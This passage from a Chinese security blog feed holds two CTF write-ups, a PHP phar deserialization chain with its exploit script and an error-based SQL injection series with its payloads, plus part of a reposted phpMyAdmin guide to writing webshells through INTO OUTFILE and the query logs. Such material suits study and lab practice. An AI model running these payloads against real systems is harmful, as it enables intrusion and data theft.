class="string">&#x27;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">            &#125; <span class="comment">//这里会将file执行func的结果输出</span></span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;td class=&quot;text-center&quot; filename=&quot;&#x27;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$filename</span>) . <span class="string">&#x27;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;download&quot;&gt;下载&lt;/a&gt; / &lt;a href=&quot;#&quot; class=&quot;delete&quot;&gt;删除&lt;/a&gt;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;/tr&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$table</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params"><span class="variable">$filename</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename = <span class="variable">$filename</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>) &amp;&amp; !<span class="title function_ invoke__">is_dir</span>(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">name</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">basename</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">size</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$size</span> = <span class="title function_ invoke__">filesize</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        <span class="variable">$units</span> = <span class="keyword">array</span>(<span class="string">&#x27; B&#x27;</span>, <span class="string">&#x27; KB&#x27;</span>, <span class="string">&#x27; MB&#x27;</span>, <span class="string">&#x27; GB&#x27;</span>, <span class="string">&#x27; TB&#x27;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$size</span> &gt;= <span class="number">1024</span> &amp;&amp; <span class="variable">$i</span> &lt; <span class="number">4</span>; <span class="variable">$i</span>++) <span class="variable">$size</span> /= <span class="number">1024</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">round</span>(<span class="variable">$size</span>, <span class="number">2</span>).<span class="variable">$units</span>[<span class="variable">$i</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">detele</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>delete.php</code>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;sandbox&#x27;</span>]);</span><br><span class="line"><span class="variable">$file</span> = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line"><span class="variable">$filename</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$filename</span>) &lt; <span class="number">40</span> &amp;&amp; <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">    <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">detele</span>();</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-type: application/json&quot;</span>);</span><br><span class="line">    <span class="variable">$response</span> = <span class="keyword">array</span>(<span class="string">&quot;success&quot;</span> =&gt; <span class="literal">true</span>, <span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$response</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-type: application/json&quot;</span>);</span><br><span class="line">    <span class="variable">$response</span> = <span class="keyword">array</span>(<span class="string">&quot;success&quot;</span> =&gt; <span class="literal">false</span>, <span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;File not exist&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$response</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里由于<code>download</code>中有<code>ini_set(&quot;open_basedir&quot;, getcwd() . &quot;:/etc:/tmp&quot;);</code> 限制, 无法读取文件</p><p>所以这里利用<code>delete.php</code></p><p>这里如果<code>POST</code>传的<code>filename</code>参数为<code>phar://xxx</code> 这里<code>xxx</code>是我们上传好的一个<code>phar</code>文件, 第17行的<code>open($filename)</code>处就会触发反序列化. </p><p>再换个角度看, 我们最终的目的是通过<code>File</code>类的<code>close</code>方法来读取<code>/flag.txt</code>, 那么在我们构造类对象的时候, <code>File</code>类的这个对象的<code>Filename</code>属性的值就得是<code>&#39;/flag.txt&#39;</code></p><p>然后如何触发<code>File</code>类的<code>close</code>方法呢, 这里注意到<code>FileList</code>类存在<code>__call</code>方法,这个方法会在调用一个本类不存在的方法时被调用</p><p>而这里在<code>FileList</code>类<code>__call</code>方法中, 会让其<code>files</code>中(这个属性是一个列表,里面存储了若干<code>File</code>类的对象)每个<code>file</code>对象来调用这个不存在的方法<code>__call($func, $args)</code>这里的参数<code>func</code>就是这个被调用的本类不存在的方法</p><p>然后<code>__call</code>方法还会将每个<code>file</code>对象的执行结果存入<code>result</code>中(89行)</p><p>在<code>FileList</code>类的<code>__destruct()</code>方法中, 会将<code>result</code>中的内容显示出来</p><p>那么我们就需要让<code>FileList</code>类的对象来调用<code>close()</code>方法,这里在<code>user</code>类中有:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public function __destruct() &#123;</span><br><span class="line">    $this-&gt;db-&gt;close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的<code>db</code>本来是用来操作数据库的,那么我们可以把 <code>user</code>的<code>db</code>属性指定为一个<code>FileList</code>类的对象,这样当这个<code>user</code>类的一个对象被反序列化并执行上面的 <code>__destruct()</code>时, 它实际上就让它内部的这个<code>FileList</code>类的对象执行了<code>close</code>方法</p><p>综上, <code>user</code>为最外层的类,也就是直接被<code>phar</code>反序列化的类,那么现在就可以着手构建这个<code>phar</code>文件了:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="variable">$file</span> = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line">        <span class="variable">$file</span>-&gt;filename = <span class="string">&quot;/flag.txt&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files = <span class="keyword">array</span>(<span class="variable">$file</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">FileList</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;db = <span class="variable">$b</span>;</span><br><span class="line"><span class="comment">//构建phar文件:</span></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;aaaaa&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>运行上面的代码, 生成一个<code>phar</code>文件:<code>phar.phar</code>,然后将其后缀名改为jpg后上传,在访问<code>delete.php</code>时如下传参就能够触发反序列化了</p><p><img src="/images/buuctf-web2/image-20221026195251664.png" alt="image-20221026195251664"></p><br><hr><br><h1 id="二次注入-报错注入-SQL正则-EasySQL"><a href="#二次注入-报错注入-SQL正则-EasySQL" class="headerlink" title="[二次注入,报错注入,SQL正则]EasySQL"></a>[二次注入,报错注入,SQL正则]EasySQL</h1><p>这里试了好久,最后发现注册用户时, 用户名用<code>aaa&quot;</code>,然后再修改密码页面才会有注入点</p><p>这里先不输入新旧密码,直接点<code>submit</code>会报错:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&quot;aaa&quot;&quot; and pwd=&#x27;7e3b7a5bafcb0fa8e8dfe3ea6aca9186&#x27;&#x27; at line 1</span><br></pre></td></tr></table></figure><p>那么这里猜测修改密码的语句就差不多是:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">update....... where name=username and pwd=oldpass </span><br><span class="line">这里由于我们的用户名是aaa&quot; 所以会在name=username那里提前闭合产生了报错,那么注入点就在这里</span><br></pre></td></tr></table></figure><p>这里只会回显报错信息,所以试一试报错注入</p><p>回到注册页面,用下面的payload作用户名(这里一开始有<code>and</code>和空格会被检测出来,所以换成<code>&amp;&amp;</code>和括号)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">111&quot;&amp;&amp;(updatexml(1,concat(0x7e,(select(user())),0x7e),1))#</span><br></pre></td></tr></table></figure><p>来到修改密码页面, 随便输入两个新旧密码后点击提交:</p><p><img src="/images/buuctf-web2/image-20221026211149576.png" alt="image-20221026211149576"></p><p>那么接下来按部就班地挖掘信息就可以了</p><p>库名:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">注册username: a&quot;&amp;&amp;extractvalue(1,concat(0x7e,(database()),0x7e))#</span><br><span class="line">输出: XPATH syntax error: &#x27;~web_sqli~&#x27; </span><br></pre></td></tr></table></figure><p>表名: </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">注册:b&quot;&amp;&amp;(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where((table_schema)=database())),0x7e),1))#</span><br><span class="line">输出:XPATH syntax error: &#x27;~article,flag,users~&#x27;</span><br></pre></td></tr></table></figure><p>列名:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">注册c&quot;&amp;&amp;(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where((table_name)=(&#x27;flag&#x27;))),0x7e),1))#</span><br><span class="line">输出:XPATH syntax error: &#x27;~flag~&#x27;</span><br></pre></td></tr></table></figure><p>数据:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">d&quot;&amp;&amp;(updatexml(1,concat(0x7e,(select(group_concat(flag))from(flag)),0x7e),1))#</span><br><span class="line">XPATH syntax error: &#x27;~RCTF&#123;Good job! But flag not her&#x27;</span><br><span class="line">.....</span><br></pre></td></tr></table></figure><p>重新查一下别的表:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">注册e&quot;&amp;&amp;(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where((table_name)=(&#x27;users&#x27;))),0x7e),1))#</span><br><span class="line">输出:</span><br><span class="line">XPATH syntax error: &#x27;~name,pwd,email,real_flag_1s_her&#x27;</span><br><span class="line">!!!!!</span><br></pre></td></tr></table></figure><p>数据:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">注册: g&quot;&amp;&amp;(updatexml(1,concat(0x7e,(select(group_concat(&#x27;real_flag_1s_here&#x27;))from(users)),0x7e),1))#</span><br><span class="line"></span><br><span class="line">这里会输出一堆垃圾数据,显示不全,为了让其输出真正地flag,需要用一下模糊查询,但这里like被过滤了</span><br><span class="line">使用regexp正则匹配,下面where((real_flag_1s_here)regexp(&#x27;^flag&#x27;)) 表示匹配以flag为开头的串</span><br><span class="line"></span><br><span class="line">g&quot;&amp;&amp;(updatexml(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)where((real_flag_1s_here)regexp(&#x27;^flag&#x27;))),0x7e),1))#</span><br><span class="line">输出:flag&#123;b0b943b3-0d22-4668-93da-01   </span><br><span class="line"></span><br><span class="line">使用reverse逆序再输出一波:</span><br><span class="line">g&quot;&amp;&amp;(updatexml(1,concat(0x7e,reverse((select(group_concat(real_flag_1s_here))from(users)where((real_flag_1s_here)regexp(&#x27;^flag&#x27;)))),0x7e),1))#</span><br><span class="line">XPATH syntax error: &#x27;~&#125;cbf5fd765010-ad39-8664-22d0-3b&#x27;</span><br><span class="line"></span><br><span class="line">拼接起来:</span><br><span class="line">flag&#123;b0b943b3-0d22-4668-93da-010567df5fbc&#125; </span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Web安全 </category>
          
          <category> 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpmyadmin各版本漏洞利用</title>
      <link href="/post/a458c677.html"/>
      <url>/post/a458c677.html</url>
      
        <content type="html"><![CDATA[<p>转自:<a href="https://www.cnblogs.com/liliyuanshangcao/p/13815242.html">https://www.cnblogs.com/liliyuanshangcao/p/13815242.html</a></p><blockquote><p><code>phpMyAdmin</code> 是一个以PHP为基础，以<code>Web-Base</code>方式架构在网站主机上的<code>MySQL</code>的数据库管理工具，让管理者可用Web接口管理<code>MySQL</code>数据库。借由此Web接口可以成为一个简易方式输入繁杂SQL语法的较佳途径，尤其要处理大量资料的汇入及汇出更为方便。其中一个更大的优势在于由于<code>phpMyAdmin</code>跟其他PHP程式一样在网页服务器上执行，但是您可以在任何地方使用这些程式产生的HTML页面，也就是于远端管理MySQL数据库，方便的建立、修改、删除数据库及资料表。也可借由<code>phpMyAdmin</code>建立常用的php语法，方便编写网页时所需要的sql语法正确性。</p></blockquote><h1 id="1信息收集"><a href="#1信息收集" class="headerlink" title="1信息收集"></a>1信息收集</h1><h2 id="1-1-版本信息获取"><a href="#1-1-版本信息获取" class="headerlink" title="1.1 版本信息获取"></a>1.1 版本信息获取</h2><p>获取<code>phpmyadmin</code>版本信息，在<strong>网址根路径</strong>后面添加</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">readme.php</span><br><span class="line">README</span><br><span class="line">changelog.php</span><br><span class="line">Change</span><br><span class="line">Documetation.html</span><br><span class="line">Documetation.txt</span><br><span class="line">translators.html</span><br></pre></td></tr></table></figure><p>（注意区分大小写）就可以看到<code>phpmyadmin</code>的相关版本信息了，这个方法也是通杀的，只要管理员不把他们删掉。</p><p>也可以直接访问：<code>/doc/html/index.html</code>目录</p><h2 id="1-2-绝对路径获取"><a href="#1-2-绝对路径获取" class="headerlink" title="1.2 绝对路径获取"></a>1.2 绝对路径获取</h2><p>(1) <code>phpinfo()</code> 页面：最理想的情况，直接显示web路径<br>(2) web报错信息：可以通过各种<code>fuzz</code>尝试让目标报错，也有可能爆出绝对路径<br>(3) 一些集成的web框架：如果目标站点是利用<code>phpstudy</code>、<code>LAMPP</code>等之类搭建的，可以通过查看数据库路径</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%datadir%&#x27;</span>;</span><br></pre></td></tr></table></figure><p>再猜解web路径的方法，一般容易成功。<br>(4) 利用<code>select load_file()</code>读取文件找到web路径：可以尝试<code>/etc/passwd</code>，<code>apache|nginx|httpd log</code>之类的文件。</p><p><em>Trick：如何判断目录是否存在，往往确定了<code>/var/www/html</code>目录，但是还有一层目录不能 确定，可以采用目标域名+常用的网站根目录的方式进行爆破，当使用</em></p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&#x27;test&#x27;</span> <span class="keyword">into</span> outfile <span class="string">&#x27;/var/www/$fuzz$/shell.php&#x27;</span>；</span><br></pre></td></tr></table></figure><p>时目录fuzzfuzz不存在将会报错<code>Can&#39;t create/write to file &#39;/var/www/html/666.txt&#39; (Errcode: 2);</code>如果存在但是目录写不进去将返回(Errcode: 13)；如果使用的</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">load</span> data infile <span class="string">&quot;/etc/passwd&quot;</span> into <span class="built_in">table</span> test;</span><br></pre></td></tr></table></figure><p>该语句执行后将也会显示文件是否存在，有权限能否写等信息。</p><p>（5）其他方法</p><figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.查看数据库表内容获取 有一些cms会保存网站配置文件 或者路径</span><br><span class="line"><span class="number">2</span>.进入后台</span><br><span class="line"><span class="number">3</span>.百度出错信息 zoomeye shadon 搜索<span class="literal">error</span> <span class="literal">warning</span></span><br><span class="line"><span class="number">4</span>. @@datadir参数看mysql路径 反猜绝对路径</span><br></pre></td></tr></table></figure><h1 id="2PhpMyAdmin利用"><a href="#2PhpMyAdmin利用" class="headerlink" title="2PhpMyAdmin利用"></a>2PhpMyAdmin利用</h1><h2 id="2-1-写入文件GetShell"><a href="#2-1-写入文件GetShell" class="headerlink" title="2.1 写入文件GetShell"></a>2.1 写入文件GetShell</h2><p>可以通过写shell进行提权，而我们需要满足以下条件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.数据库root权限</span><br><span class="line">2.知道网站的物理路径</span><br><span class="line">3.数据库有写权限</span><br></pre></td></tr></table></figure><p><code>MySQL 5.0+</code>的版本会，然后在服务运行的情况下修改变量变量也可以移动文件位置的，但是必须要对生成日志的目录具有可更改的写权限。（Linux环境下可能会比较苛刻，因为站点目录是一个用户，MySQL是另外一个用户，权限管控较大严格，主要取决于权限配置是否得当）</p><h3 id="2-1-1-直接写入文件getshell"><a href="#2-1-1-直接写入文件getshell" class="headerlink" title="2.1.1 直接写入文件getshell"></a>2.1.1 直接写入文件getshell</h3><p>直接用<code>into outfile</code>直接在网站目录下写入webshell，但是该方法需要前提条件是：<br>(1) 当前的数据库用户有写权限<br>(2) 知道web绝对路径<br>(3) web路径能写</p><p>如何判断当前数据库用户有写权限？<br>执行：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%secure%&#x27;</span>;</span><br></pre></td></tr></table></figure><p>如果secure_file_priv如果非空，则只能在对应的目录下读文件，如果是空即可在其他目录写。Linux下默认&#x2F;tmp目录可写。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">secure<span class="operator">-file</span><span class="literal">-priv</span>特性</span><br><span class="line">secure<span class="operator">-file</span><span class="literal">-priv</span>参数是用来限制LOAD <span class="keyword">DATA</span>, <span class="built_in">SELECT</span> ... OUTFILE, and LOAD_FILE()传到哪个指定目录的。</span><br><span class="line">当secure_file_priv的值为null ，表示限制mysql 不允许导入|导出</span><br><span class="line">当secure_file_priv的值为/tmp/ ，表示限制mysql 的导入|导出只能发生在/tmp/目录下</span><br><span class="line">当secure_file_priv的值没有具体值时，表示不对mysql 的导入|导出做限制</span><br><span class="line">可以在mysql<span class="literal">-ini</span>文件中设置其属性</span><br></pre></td></tr></table></figure><p>编写一句phpinfo文件，</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">select &quot;</span><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span><span class="language-xml">&quot; INTO OUTFILE  &quot;d:\\phpstudy\\www\\7.php&quot;</span></span><br></pre></td></tr></table></figure><p>这里必须注意要双反斜线，否则会转义，</p><h3 id="2-1-2-通过写入日志文件getshell"><a href="#2-1-2-通过写入日志文件getshell" class="headerlink" title="2.1.2 通过写入日志文件getshell"></a>2.1.2 通过写入日志文件getshell</h3><p>读写权限+web绝对路径，修改日志文件为webshell</p><p>具体利用方法如下</p><p>(1) 开启日志记录:</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log = <span class="string">&quot;ON&quot;</span>;</span><br></pre></td></tr></table></figure><p>(2) 查看当前的日志目录:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;general%&#x27;</span>;</span><br></pre></td></tr></table></figure><p>(3) 指定日志文件</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log_file = <span class="string">&quot;C:/phpStudy/PHPTutorial/WWW/404.php&quot;</span>;</span><br></pre></td></tr></table></figure><p>(4)) 写入执行代码：</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">select &quot;</span><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span><span class="language-xml">&quot;;</span></span><br></pre></td></tr></table></figure><h3 id="2-1-3-通过慢查询写入webshell"><a href="#2-1-3-通过慢查询写入webshell" class="headerlink" title="2.1.3 通过慢查询写入webshell"></a>2.1.3 通过慢查询写入webshell</h3><p>具体方法如下：</p><p>(1) 查看当前慢查询日志目录：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%slow%&#x27;</span>;</span><br></pre></td></tr></table></figure><p>(2) 重新设置路径：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">GLOBAL</span> slow_query_log_file<span class="operator">=</span><span class="string">&#x27;C:/phpStudy/PHPTutorial/WWW/slow.php&#x27;</span>;</span><br></pre></td></tr></table></figure><p>(3) 开启慢查询日志：</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">GLOBAL</span> slow_query_log=<span class="keyword">on</span>;</span><br></pre></td></tr></table></figure><p>(4)) 执行写入日志：</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">select &#x27;</span><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span><span class="language-xml">&#x27; from mysql.db where sleep(10);</span></span><br></pre></td></tr></table></figure><h2 id="2-2-User-defined-funct-ion（UDF）："><a href="#2-2-User-defined-funct-ion（UDF）：" class="headerlink" title="2.2 User defined funct ion（UDF）："></a><strong>2.2 User defined funct ion（UDF）：</strong></h2><p>适用于Windows和Linux环境，利用需要的条件：具有写权限+插件目录可写（或者可以更改指定的插件目录）。具体情况要看目标mysql的版本：<br>(1) <code>Mysql version &gt; 5.1</code>时，dll或者so必须位于mysql安装目录<code>lib\plugin</code>下，当对该目录具有写权限时可以利用，查看：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span 